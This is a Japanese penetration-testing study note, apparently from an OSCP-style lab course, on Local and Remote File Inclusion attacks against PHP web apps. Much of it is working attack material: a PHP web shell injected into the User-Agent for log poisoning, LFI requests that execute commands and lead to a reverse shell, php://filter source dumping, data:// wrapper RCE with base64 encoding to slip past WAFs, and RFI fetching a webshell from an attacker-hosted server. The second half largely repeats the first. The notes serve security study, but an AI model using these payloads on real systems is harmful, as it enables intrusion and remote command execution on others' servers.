# 概要

Path traversalとの違い：

|手法|できること|
|---|---|
|Path traversal|任意のファイルを**読み取る**|
|File Inclusion|任意のファイルを**実行する**（＋読み取りも可）|

File Inclusionはファイルを実行できるため、任意のコマンド実行（RCE）が可能であり、Path traversalより深刻な脆弱性。

|種類|説明|
|---|---|
|LFI（Local File Inclusion）|ターゲットの**ローカル**環境にあるファイルを読み込ませる|
|RFI（Remote File Inclusion）|**リモート**（主に攻撃者がホストする）のファイルを読み込ませる|

---

# LFI

## LFI × ログポイズニング

Webサーバーのアクセスログに悪意あるWebShellコードを書き込み、LFIで実行させる手法。

**攻撃条件：**

- ログファイルの場所がわかっていること
- ログファイルにユーザー制御可能な値が記録されていること（User-Agentなど）

**ログファイルの場所：**

- Linux（Apache）：`/var/log/apache2/access.log`
- Windows（XAMPP）：`C:\xampp\apache\logs\`
- その他はWebサーバーソフトウェアのドキュメントを参照

### 手順

1. LFIでログファイルを読み取り、何が記録されるかを確認する
```zsh
curl http://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
	↓
```
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 ..."
```
- → User-Agentがログに記録される＝ユーザー制御可能と判断できる

2. Burp SuiteでUser-AgentにWebShellペイロードを注入してリクエストを送る
```php
<?php echo system($_GET['cmd']); ?>
```

![](../../Images/Pasted%20image%2020250322224544.png)



3. LFIでログファイルを読み込み、WebShellが実行されるか確認する（URLエンコードすること）

```http
GET /index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```

`ps`の結果が返ってきたら成功。

4. リバースシェルリスナーを立て、リバースシェルコマンドをURLエンコードして実行する → [bashでリバースシェルを確立する基本的なコマンド](https://claude.ai/Cheatsheet/Common/%E5%BF%98%E3%82%8C%E3%81%8C%E3%81%A1%E3%81%AA%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\(Linux%E3%83%BBWindows\).md#bash%E3%81%A7%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%92%E7%A2%BA%E7%AB%8B%E3%81%99%E3%82%8B%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)

---

## PHP Wrappers

PHPのwrapperを使ってLFIを拡張できる。

### php://filter

**用途：** PHPファイルの内容を**実行せずに**表示する。コードの中身を丸ごと閲覧でき、機密情報の取得やアプリのロジック解析に使える。

> [!NOTE] `.php` だけでなく `.py` など他の実行可能ファイルにも使える。

#### 手順

1. HTTPリクエストでファイルを指定している箇所を見つける

```
http://example.com/index.php?page=admin.php
```

2. Burp Suiteでファイルを実行した結果を確認し、タグが閉じられていないなど不自然なコードがないか探す

![](https://claude.ai/Images/Pasted%20image%2020250329113419.png)

3. `php://filter` wrapperでファイルの中身を表示する（結果が変わらない場合は次のステップへ）

```
GET /index.php?page=php://filter/resource=admin.php
```

4. Base64エンコードして中身を取得する

```
GET /index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

5. 取得したBase64文字列をデコードする

```zsh
echo "<base64_encoded_resource>" | base64 -d
```

---

### data://

**用途：** 任意のコードをリクエストに直接埋め込んで実行させる（RCE）。

**攻撃シチュエーション：** WebアプリにPHPコードを直接書き込めない場合（WebShellが使えないときなど）に使う。

> [!WARNING] PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。

#### 手順

1. HTTPリクエストでファイルを指定している箇所を見つける
    
2. Burp Suiteで `data://` を使って任意のコマンドを実行する
    

```http
GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
```

3. WAFなどでブロックされる場合はBase64エンコードして試す

```zsh
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

```http
GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls
```

#### 参考

- filter：🔗[php manual - wrappers.php](https://www.php.net/manual/en/wrappers.php.php)
- data：🔗[php manual - wrappers.data](https://www.php.net/manual/en/wrappers.data.php)
- その他wrapper：🔗[php manual - wrappers](https://www.php.net/manual/en/wrappers.php)

---

# RFI（Remote File Inclusion）

**用途：** LFIとほぼ同じだが、HTTP/SMBを介して**リモートシステム**（攻撃者がホストするサーバーなど）からファイルをインクルードして実行できる。

> [!WARNING] PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。

## 手順

1. ターゲットに実行させたいファイル（WebShell）を攻撃者のマシンに用意する
    
    - `/usr/share/webshells/php/`
    - pentest-monkeyのreverse shellなど
2. ファイルをホストしているディレクトリでWebサーバーを起動する
    

```zsh
sudo python3 -m http.server 80
```

3. Burp Suiteで攻撃者がホストするファイルをターゲットに実行させる

```http
GET /index.php?page=http://<attacker_IP>/<webshell.php>&cmd=ls
```


---
---


### LFI x ログポイズニング 

- 概要：Webサーバーが取得するアクセスログに悪意あるWebShellを読み込ませて、実行させる
- 攻撃条件：どの値が攻撃者によって制御可能なのかを知っていること
	- 今回は、ログファイルがRead, Write可能であるため、ログファイルの中身を明らかにすること

- 汚染するログファイルの場所については、Webサーバーソフトウェアのドキュメントを読んで探す
	- Windowsの場合は、アプリケーション固有の場所にある（例えば、XAMPPが稼働している場合は、`C:¥xampp¥apache¥logs¥`にある）

#### LFI x ログポイズニングの流れ

1. LFI（ここではPath traversalと同等）の脆弱性を用いて、ログファイルに何が記録されるか読みとる
```zsh
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
- ↑User-agentがログに記録されることがわかる＝ユーザー制御可能

2. ログを取得しているパス(上記3行目GET以降)に対し、ユーザー制御可能な値（今回はUser-Agent）にWebShellペイロードを実装し、HTTPリクエスト
```php
<?php echo system($_GET['cmd']); ?>
```

![](../../Images/Pasted%20image%2020250322224544.png)

$$User-Agentにペイロードを注入$$

3. ステップ２でWebShellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
```http
meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```
- `ps`の結果が返ったら成功

4. リバースシェルリスナーを立て、[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#bashでリバースシェルを確立する基本的なコマンド)をURLエンコードして実行

### PHP Wrappers

- `php://filter`はファイルを実行せずに内容の表示が可能
	- （単なる"パストラバーサル" or "LFIのファイル指定"だとファイルが実行される）
- `data://`は任意コードを実行可能

#### php://filter

##### 概要

- 用途：PHPファイルの内容を<u>実行せずに</u>表示できるため、コードの中身を丸ごと閲覧可能で、機密情報の取得やアプリのロジック解析に使える
- シチュエーション：HTTPリクエストでファイルを指定しているとき
- 仕組み：ファイルの中身がROT13やBase64のエンコード有無にかかわらず、実行可能ファイル(`php`, `py`等)を表示できる(⚠️`php`だけに限らない)

##### php://filterによるデータ抽出手順

1. HTTPリクエストでファイルを指定している箇所を見つける
```zsh
# 例
http://example.com/index.php?page=admin.php
```

2. Burp Suiteでファイルを実行した結果を閲覧する。このとき、`<body>` などのタグが閉じられていないなど、不自然なコードがないかを探す。

![](../../Images/Pasted%20image%2020250329113419.png)

3. `php://filter` wrapperを使用してファイルの中身を表示する。もし、ステップ２と結果が変わらない場合は次のステップに進む
```
GET /index.php?page=php://filter/resource=admin.php
```
- resourceはこのwrapperに必要なパラメタ

4. 指定したresourceの中身をすべてをbase64にエンコードする
```
GET /index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
```html
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

5. ターミナル上で、Base64 で取得したデータを `base64 -d` でデコードすると、中身がすべて表示される
```zsh
echo "<basee64_encoded_resource>" | base64 -d
```

#### data://

##### 概要

- 用途：任意のコマンドを実行させる
- 攻撃シチュエーション：
	- 対象のマシンに直接PHPコードを埋め込むことができない場合(※)
	- また、HTTPリクエストでファイルを指定しているとき
		- (※：`<?php echo system($_GET['cmd']); ?>`などをwebアプリに埋め込むことができずwebshell使えないときなど）
	- ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))と`allow_url_fopen`が有効のときしか使えない(デフォルト無効になっている)
- 仕組み：データ要素をプレーンテキストもしくはbase64エンコードして実行中のwebアプリのコードに埋め込む

##### data wrapperによるRCE手順

1. HTTPリクエストでファイルを指定している箇所を見つける（以下例↓）
```
http://example.com/index.php?page=admin.php
```

2. Burp Suiteにて、data://を使い、任意の任意のコマンドを実行する
```http
GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
```

3. WAF等が原因でコード実行が妨げられる場合は、data://ではbase64エンコードが使えるので試す
```zsh
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```
```http
GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
```

##### 🔗参考

- filter : [php manual](https://www.php.net/manual/en/wrappers.php.php)
- data : [php manual](https://www.php.net/manual/en/wrappers.data.php)
- その他のwrapper : [php manual](https://www.php.net/manual/en/wrappers.php)

### RFI

#### RFIの概要

- 用途：LFIとほぼ同じ。異なるのは、HTTP1やSMB2を介して<u>リモートシステム</u>(攻撃者のホストするサーバ等)からファイルをインクルード可能なところ
- シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](#LFI%20x%20ログポイズニング)
- ⚠️注意：PHPの🔗[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）

#### RFI実行手順

1. ターゲットのWebアプリに実行させたいファイル（WebShell）などを攻撃者のマシンにホストする
	- `/usr/share/webshells/php`
	- pentest-monkeyのreverse shellなど

2. ファイルをホストしているディレクトリ上でwebサーバーを開始
```zsh
sudo python -m http.server 80
```

3. Burp Suite上で、ターゲットのWebアプリから攻撃者がホストするファイルを実行させ、任意のコマンドを実行する
```
GET /index.php?page=http://<AttackerIP>/<webshell.php>&cmd=ls
```
